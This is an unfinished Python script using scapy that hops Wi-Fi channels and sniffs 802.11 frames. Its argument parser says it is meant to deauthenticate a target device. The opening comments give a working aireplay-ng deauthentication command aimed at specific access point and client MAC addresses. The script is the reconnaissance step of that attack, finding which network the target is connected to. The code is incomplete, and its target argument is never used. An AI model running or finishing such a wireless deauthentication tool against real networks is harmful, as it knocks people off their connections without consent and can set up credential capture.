# sudo systemctl stop NetworkManager.service wpa_supplicant.service
# sudo aireplay-ng -0 1 -a A4:08:F5:A6:C4:78 -c 6C:AD:F8:95:C8:A0 wlp3s0mon
import argparse
import random
import os
import time
import signal
from scapy.all import sniff, Dot11FCS
from multiprocessing import Process

class FindConnection:
	def __init__(self, interface, target):
		self.interface = interface
		self.target = target
		self.is_stopping = False
		# todo: checks

	def run(self):
		# Continually hop between channels
		self.hopping_process = Process(target=self.hopping_loop, args=(args.interface,))
		self.hopping_process.start()
		
		signal.signal(signal.SIGINT, self.shutdown)

		# Sniff for a packet between the target and another device
		self.sniffing_process = Process(target=self.sniff)
		self.sniffing_process.start()

	def shutdown(self, _a, _b):
		self.hopping_process.terminate()
		self.hopping_process.join()
		self.sniffing_process.terminate()
		# self.sniffing_process.join()

	def sniff(self):
		try:
			print("Starting sniffing")
			sniff(iface=self.interface, prn=self.handle_packet)
		finally:
			print("Stopping sniffing")
	
	def handle_packet(self, packet):
		if packet.haslayer(Dot11FCS):
			print(packet.addr1, packet.addr2)

	def hopping_loop(self, interface):
		try:
			print("Starting channel switching")
			CHANNELS = [11,36] # TODO
			i = 0
			while True:
				channel = CHANNELS[i]
				print(interface, channel)
				os.system("iwconfig %s channel %d" % (interface, channel))
				i = (i + 1) % len(CHANNELS)
				time.sleep(0.1)
		finally:
			print("Stopping channel switching")



if __name__ == "__main__":
	parser = argparse.ArgumentParser(description='Deauthenticate a target device')
	parser.add_argument('-i', '--interface', dest='interface', type=str, required=True, help='Interface to use for sniffing and packet injection')
	parser.add_argument('-t', '--target', dest='target', type=str, required=True, help='MAC Address to deauth')
	args = parser.parse_args()

	x = FindConnection(args.interface, args.target)
	x.run()